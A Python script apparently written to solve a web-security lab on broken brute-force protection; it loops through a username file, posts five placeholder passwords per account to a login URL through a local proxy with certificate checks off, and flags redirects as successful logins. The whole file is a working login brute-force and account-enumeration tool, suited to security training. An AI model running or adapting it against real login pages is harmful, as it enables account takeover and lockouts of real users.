# Lab Broken brute-force protection, IP block
import sys

import requests
import urllib3
from colorama import Fore

urllib3.disable_warnings()

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# enumate all the usernames with 5 passwords each to test if the account is locked
# try a first time and when you found a typical content-lenght you can add it line 41
# to print only the account that are getting locked


def take_cookie(url, s):
    r = s.get(url, verify=False, proxies=proxies, timeout=5)
    session_cookie = r.cookies.get("session")
    print(f"{Fore.GREEN}[+] Session cookie: {session_cookie}{Fore.RESET}")
    if session_cookie is None:
        print(f"{Fore.RED}[-] Session cookie not found{Fore.RESET}")
        sys.exit(1)


def bruteforce_login(s, url):
    take_cookie(url, s)
    with open("/Users/robin/Desktop/usernames.txt", "r") as user_file:
        for username in user_file:
            for i in range(1, 6):
                password = f"password_{i}"
                data = {"username": username.strip(), "password": password.strip()}
                r = s.post(
                    url,
                    data=data,
                    verify=False,
                    proxies=proxies,
                    timeout=5,
                    allow_redirects=False,
                )
                r.raise_for_status()
                # if (r.headers['Content-Length'] != "3132"):
                print(
                    f"{username.strip()} | {password.strip()} => {r.headers['Content-Length']}"
                )

                if r.status_code == 302:
                    print(
                        f"{Fore.GREEN}[-] {username.strip()} logged in successfully {data} {Fore.RESET}"
                    )
                elif r.status_code == 200:
                    print(f"{Fore.RED}[-]{Fore.RESET}")
                else:
                    print(
                        f"{Fore.RED}[-] Unexpected response code: {r.status_code}{Fore.RESET}"
                    )


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url>")
        sys.exit(1)

    s = requests.Session()
    url = sys.argv[1]
    bruteforce_login(s, url)


if __name__ == "__main__":
    main()
